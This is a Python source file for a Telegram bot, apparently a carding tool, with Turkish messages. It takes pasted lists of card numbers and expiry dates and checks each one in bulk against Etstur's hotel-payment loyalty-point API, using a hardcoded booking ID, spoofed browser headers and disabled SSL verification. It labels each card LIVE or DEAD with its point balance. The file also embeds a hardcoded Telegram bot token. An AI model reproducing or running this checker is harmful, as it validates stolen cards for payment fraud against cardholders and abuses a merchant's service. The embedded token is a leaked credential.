# language: Python, file: bot.py, target: Linux, Python 3.10+
import asyncio
import aiohttp
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

API_TOKEN = "8836035013:AAHXLqHRwe9GIfV5dzvcrT1S2_RmAaHYb64"
BOOKING_UUID = "a598c4dc-a6ff-40fd-a791-6797d715bb59"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class CheckerState(StatesGroup):
    waiting_for_cards = State()

async def puan_sorgula(session, kart_no, ay, yil):
    if len(yil) == 4:
        yil = yil[2:]

    h = {
        "accept": "application/json, text/plain, */*",
        "authorization": "null",
        "content-type": "application/json",
        "origin": "https://www.etstur.com",
        "referer": f"https://www.etstur.com/checkout/checkout/hotel/step2?bookingUuid={BOOKING_UUID}",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }

    data = {
        "bookingUuid": BOOKING_UUID,
        "creditCardOwnerName": "GUEST USER",
        "creditCardNumber": kart_no,
        "creditCardValidMonth": ay,
        "creditCardValidYear": yil,
        "typeId": "52",
        "groupId": 1,
        "isSaveCard": False,
        "usePoint": False
    }

    try:
        async with session.post(
            "https://www.etstur.com/services/api/hotel/payment/get-credit-card-point",
            headers=h, json=data, timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            if r.status != 200:
                return "DEAD", 0, "", f"HTTP_{r.status}"
            
            result = await r.json()
            msg = str(result.get("errorMessage", "")).strip()
            res = result.get("result") or {}
            puan = res.get("pointAmount", 0)
            success = res.get("success", False)

            if success or puan > 0:
                return "LIVE_PUAN", puan, res.get("currency", "TL"), msg
            elif msg:
                return "MSG_DEAD", 0, "", msg
            else:
                return "DEAD", 0, "", "Declined"
    except Exception as e:
        return f"HATA:{e}", 0, "", str(e)

async def process_single(session, satir):
    parca = satir.replace(";", "|").replace(",", "|").split("|")
    if len(parca) < 3:
        return f"❌ {satir} -> Format Hatalı"

    kart_no = parca[0].strip().replace(" ", "")
    ay = parca[1].strip().zfill(2)
    yil = parca[2].strip()

    if len(kart_no) != 16:
        return f"❌ {kart_no} -> Geçersiz Uzunluk"

    durum, puan, para, mesaj = await puan_sorgula(session, kart_no, ay, yil)

    if durum == "LIVE_PUAN":
        return f"🟢 **LIVE** | `{kart_no}` | **{puan} {para}** | {mesaj}"
    elif durum == "MSG_DEAD":
        return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
    elif durum == "DEAD":
        return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
    else:
        return f"⚠️ **HATA** | `{kart_no}` | {durum}"

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer("🤖 **Etstur Puan Checker Bot**\n\nFormat: `NUMARA|AY|YIL|CVV` (Alt alta toplu gönderebilirsin).\n\nKartları göndermek için /kontrol komutunu yazın.")

@dp.message(Command("kontrol"))
async def cmd_kontrol(message: types.Message, state: FSMContext):
    await state.set_state(CheckerState.waiting_for_cards)
    await message.answer("📝 Sorgulanacak kartları alt alta gönderin:")

@dp.message(CheckerState.waiting_for_cards)
async def handle_cards(message: types.Message, state: FSMContext):
    satirlar = [s.strip() for s in message.text.split("\n") if s.strip()]
    if not satirlar:
        await message.answer("⚠️ Liste boş.")
        return

    status_msg = await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
    
    sem = asyncio.Semaphore(10)
    connector = aiohttp.TCPConnector(limit=15, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for satir in satirlar:
            async def bounded_task(s=satir):
                async with sem:
                    return await process_single(session, s)
            tasks.append(bounded_task())

        results = await asyncio.gather(*tasks)

    await state.clear()
    
    chunk = ""
    for res in results:
        if len(chunk) + len(res) > 3800:
            await message.answer(chunk, parse_mode="Markdown")
            chunk = ""
        chunk += res + "\n"
    
    if chunk:
        await message.answer(chunk, parse_mode="Markdown")
    
    await message.answer("✅ **Tarama Tamamlandı!**")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())